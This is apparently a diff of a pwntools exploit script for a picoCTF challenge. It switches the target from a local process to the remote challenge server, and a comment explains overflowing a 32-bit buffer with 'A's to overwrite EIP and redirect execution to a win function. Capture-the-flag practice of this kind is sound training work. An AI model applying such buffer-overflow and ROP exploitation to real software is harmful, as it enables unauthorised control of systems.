@@ -1,7 +1,8 @@
 from pwn import *
 
 elf = context.binary = ELF('./vuln')
-p = process()
+#p = process()
+p = remote('dolphin-cove.picoctf.net', 59944)
 
 #in 32 bit files, you don't need the ret gadget actually. You can do spamming A until hit EIP and then you can direct to win.
 rop = ROP(elf)
